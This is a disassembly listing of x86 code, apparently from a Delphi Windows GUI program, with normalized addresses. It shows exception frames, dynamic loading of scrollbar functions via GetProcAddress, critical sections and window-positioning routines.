mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42c28c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42b1dc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42c2bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42c44e
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42b1dc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c3e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c455
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42b1dc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
mov eax esi
xor edx edx
call sub_42b1dc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42b1dc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42b1dc
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42c45c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42c541
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c548
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404abc
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42b1dc
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405a50
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a7c
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42b1dc
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405a50
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a7c
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42c778
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c86b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_40405c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c872
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404abc
lea eax [ ebp - 0x10 ]
call sub_405a38
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405a7c
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42b1dc
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405a50
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405a7c
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42c890
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c96f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40405c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c976
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404abc
lea eax [ ebp - 0x8 ]
call sub_405a38
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a7c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42b1dc
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405a50
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405a7c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42c990
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405aac
xor eax eax
push ebp
push sub_42c9df
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c9e6
lea eax [ ebx + 0xc ]
call sub_405a38
sub_42c9ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_42ca81
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_40405c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42c778
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ca88
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
call sub_42c28c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42c2bc
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42c45c
sub_42caac
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42b1dc
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42b1dc
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41a358
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42b1dc
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_41a358
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_41a358
sub_42cb38
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_42c24c
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403234
mov eax [ esi + 0x14 ]
call sub_403234
mov eax [ esi + 0x10 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405a38
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_42cb8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cbc3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cbca
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42cbd4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cbf9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cc00
retn
sub_42cc0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cc3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cc44
retn
mov eax [ rw-data ]
call sub_403234
sub_42cc50
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42cc84
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42ccac
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42cf2e
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cf55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf5c
retn
sub_42cf70
mov esp 0x42cf
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
iretd
sub_42cfd8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al dl
inc edx
add [ eax + eax ] bl
add [ eax ] al
jo r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x20 ] si
rol [ edx ] 0x1
inc edx
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffff8443104e
rol [ edx ] 0x1
mov ah 0xd0
inc edx
add al al
rol [ edx ] 0x1
adc [ ebx + eax * 2 + 0x72 ] dl
imul esi [ ecx + ebp * 2 + 0x63 ] 0x65536c61
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
sub_42d044
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42d084
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_42d0dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d101
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d108
retn
sub_42d114
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42d0cc
xor eax eax
push ebp
push sub_42d2cb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d2d2
mov eax [ rw-data ]
call sub_42d0d4
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42d2d4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42d0cc
xor eax eax
push ebp
push sub_42d687
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d68e
mov eax [ rw-data ]
call sub_42d0d4
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42da38
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42da60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42daa8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42daaf
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403234
call sub_42d114
cmp [ rw-data ] 0x0
jg r-xdata
sub_42dad0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42daf5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dafc
retn
sub_42db08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42db2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db34
retn
sub_42db40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42db65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db6c
retn
sub_42db78
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42db9d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dba4
retn
sub_42dbb0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42dbd5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dbdc
retn
sub_42dbe8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42dc0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dc14
retn
sub_42dc20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42dc45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dc4c
retn
sub_42dc60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42dc85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dc8c
retn
sub_42dc98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42dcbd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dcc4
retn
sub_42e060
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46023c
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_45c7dc
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_45c7dc
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_45ff40
mov edi eax
mov eax ebx
call sub_45ff24
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_45ff0c
mov edi eax
mov eax ebx
call sub_45ff58
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_42e114
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
